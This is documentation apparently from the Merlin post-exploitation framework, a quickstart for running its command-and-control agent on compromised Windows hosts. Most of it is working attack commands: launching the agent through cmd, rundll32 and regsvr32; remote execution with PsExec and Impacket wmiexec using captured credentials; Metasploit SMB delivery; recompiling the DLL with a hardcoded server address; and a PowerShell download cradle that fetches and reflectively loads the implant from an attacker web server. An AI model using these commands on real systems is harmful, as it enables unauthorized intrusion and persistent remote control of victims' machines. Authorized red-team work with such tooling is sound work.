.. _agent_quickstart:

============
Merlin Agent
============

Merlin is a post-exploitation framework and therefore documentation doesn't cover any of the steps required to get to a point where you can execute code or commands on a compromised host. Exploiting or accessing a host must performed prior to leveraging Merlin.

| **Pre-compiled Merlin Agent binary files are distributed with the server download in the** ``data/bin/`` **directory of Merlin**

----------------
Upload & Execute
----------------

One of the more simple ways to run Merlin is by uploading the compiled binary file to a compromised host and then execute that binary.

| Don't forget to specify the address of your Merlin server with the ``-url`` flag. Default is `https://127.0.0.1:443/`

-------------------------------
Windows Local Command Execution
-------------------------------

This section covers executing the Merlin agent with local command execution.

Windows EXE - cmd.exe
^^^^^^^^^^^^^^^^^^^^^

With the `merlinAgent.exe` binary file already downloaded on to the compromised host, execute it by calling it from the command line. Double clicking the executable file will cause the agent to run **without** a window, so you will not see anything, and it will connect to the **default** URL of `https://127.0.0.1:443/`. This can be changed by recompiling the agent with the hardcoded address of your Merlin server.

cmd.exe example::

    C:\Users\Bob\Downloads>merlinAgent.exe -url https://192.168.1.100:443/

Windows DLL - rundll32.exe
^^^^^^^^^^^^^^^^^^^^^^^^^^

With the `merlin.dll` binary file already downloaded on to the compromised host, execute it by calling it from the command line using the `rundll32.exe` program that comes with Windows. `Run` is the name of the DLL entrypoint called when the DLL is executed. Provide the URL for your listening Merlin server after the entrypoint.

rundll32.exe example::

    C:\Users\Bob\Downloads>C:\WINDOWS\System32\rundll32.exe merlin.dll,Run https://192.168.1.100:443/

--------------------------------
Windows Remote Command Execution
--------------------------------

This section covers executing Merlin agent when remotely accessing a host.

Windows EXE - PsExec.exe
^^^^^^^^^^^^^^^^^^^^^^^^

The Microsoft Sysinternals `PsExec.exe <https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>`_ application can be used to connect to a remote host, upload the Merlin agent file, and execute it. The downside to this is the Merlin agent binary file is "on disk" and provides an opportunity for Anti-Virus software to detect the application. Use PsExec's `-c` flag to specify the location of the Merlin agent file on the attacker's host that will be uploaded to the remote host. The PsExec `-d` flag is required so that control is returned to the user after executing the Merlin agent file.

PsExec.exe example::

    PS C:\SysinternalsSuite>.\PsExec.exe \\192.168.1.10 -u bob -p password -d -c C:\merlin\data\bin\windows\merlinAgent.exe -url https://192.168.1.100:443/

Windows DLL - Metasploit's SMB Delivery
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

One method for delivery is to use an SMB server to host the payload and execute a command on the remote host to download and run the Merlin agent file. The Metasploit `windows/smb/smb_delivery` module is a good way to quickly stand up an SMB server for delivering the payload.

Setup the ``windows/smb/smb_delivery`` module::

    msf > use windows/smb/smb_delivery
    msf exploit(windows/smb/smb_delivery) > set FILE_NAME merlin.dll
    FILE_NAME => merlin.dll
    msf exploit(windows/smb/smb_delivery) > set EXE::Custom /opt/merlin.dll
    EXE::Custom => /opt/merlin/data/bin/dll/merlin.dll
    msf exploit(windows/smb/smb_delivery) > set DisablePayloadHandler true
    DisablePayloadHandler => true
    msf exploit(windows/smb/smb_delivery) > set VERBOSE true
    VERBOSE => true
    msf exploit(windows/smb/smb_delivery) > run
    [*] Exploit running as background job 0.
    msf exploit(windows/smb/smb_delivery) >
    [*] Server started.
    [*] Run the following command on the target machine:
    [*] Using custom payload /opt/merlin.dll, RHOST and RPORT settings will be ignored!
    rundll32.exe \\192.168.1.100\WxlV\merlin.dll,0


| **NOTE:** We must change the DLL entry point from `0` to `Run` and provide the URL of the listening Merlin server

Now that the SMB server is setup to deliver the `merlin.dll` file, we need to remotely access the target host and execute the command. By default, Metasploit sets the entry point to `0`. We need to modify the command to change the entry point to `Run` and specify the location of our listening Merlin server. `Impacket's <https://github.com/CoreSecurity/impacket>`_ `wmiexec.py` Python program is one way to remotely access a host.

wmiexec.py example:

| **NOTE:** We must change the DLL entry point from `0` to `Run` and provide the URL of the listening Merlin server

::

    root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.10
    Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

    [*] SMBv2.1 dialect used
    [!] Launching semi-interactive shell - Careful what you execute
    [!] Press help for extra shell commands
    C:\>rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:443/

Advanced
--------

The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify, or simply don't want to, the URL for the listening Merlin server. In this case, the Merlin agent binary should be recompiled with a hardcoded URL of the listening Merlin server so that it does not need to be specified by the user during execution. *Do not continue on unless you are OK to deal with things that sometimes work and often have bugs and are not reliable.*

| This will require that you have Go and gcc installed on the host compiling the application. View the DLL's `README <https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/dll/README.MD>`_ for additional information.

Recompile DLL
^^^^^^^^^^^^^

The `merlin.dll` file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.

1. Clone the merlin repository using git
2. Edit the file at `cmd/merlinagentdll/main.go`
3. Find the string `var url = "https://127.0.0.1:443/"` and change the address
4. Compile the DLL

example::

    cd /opt
    git clone -b dev https://github.com/Ne0nd0g/merlin.git
    cd merlin
    sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' cmd/merlinagentdll/main.go
    make agent-dll


This will leave the `merlin.dll` in the `data/temp/v0.5.0/` directory where `v0.5.0` is the current version number of Merlin. Now the recompdiled version of the DLL can be run without having to specify the address of the Merlin server.

rundll32.exe examples:

* ``rundll32.exe merlin,main``

* ``rundll32.exe merlin,Run``

regsvr32.exe examples:

* ``regsvr32.exe /s merlin.dll``

* ``regsvr32.exe /s /u merlin.dll``

* ``regsvr32.exe /s /n /i merlin.dll``

PowerShell - Invoke-Merlin.ps1
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

| **WARNING: This script is very unstable**

The ``Invoke-Merlin.ps1`` PowerShell script can be found in the ``data/bin/powershell`` directory. This script leverages the work done by the PowerSploit team to reflectively load  `merlin.dll` into memory. View the `README <https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/powershell/README.MD>`__ for additional details. By default, Invoke-Merlin connects to `https://127.0.0.1:443/`. At the time of this writing, I have not found a way to provide an argument of the listening Merlin server's address when calling the DLL. Therefore, this requires recompiling the DLL with the hardcoded address of the listening Merlin server as shown in the *Recompile DLL* section above. The `Invoke-Merlin.ps1` script needs to be updated with the Base64 encoded version of the new recompiled `merlin.dll` file. The quickest way to update Invoke-Merlin.ps1 is to use the set commands below from a PowerShell terminal.

* Read the DLL into a variable:

 ``$PEBytes = [IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')``

* Base64 encode the DLL and save it in another variable:

  ``$Base64String = [System.Convert]::ToBase64String($PEBytes)``

* Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:

  ``(Get-Content data/bin/powershell/Invoke-Merlin.ps1) | foreach-object {$_ -replace '^\$global\:merlin \= (.*)', ('$global:merlin = ' + "'" + $Base64String + "'")} | Set-Content data/bin/powershell/Invoke-Merlin.ps1``

Now the Invoke-Merlin script is ready to be downloaded and executed. Fair warning, the script can be extremely executing the call back to the listening Merlin server. Give it a couple of minutes before rage quitting. Additionally, the `-ForceASLR` flag for Invoke-Merlin.ps1 is required to circumvent other errors that arise when executing the script. Host the Invoke-Merlin.ps1 script on any web server and use a PowerShell download cradel to execute it on the remote host.

Python's `SimpleHTTPServer` module can be used to quickly host the file. Move into the directory where you have a copy of the updated Invoke-Merlin.ps1 script and run the Python module.

python SimpleHTTPServer example::

    python -m SimpleHTTPServer 80

Now the script can be downloaded and executed on a remote host using a tool like Impacket's wmiexec.py.

wmiexec.py example::

    root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.92 "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-Merlin.ps1');Invoke-Merlin -ForceASLR"
    Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

    [*] SMBv2.1 dialect used

    ^C[-]
    root@kali:/opt/impacket/examples#

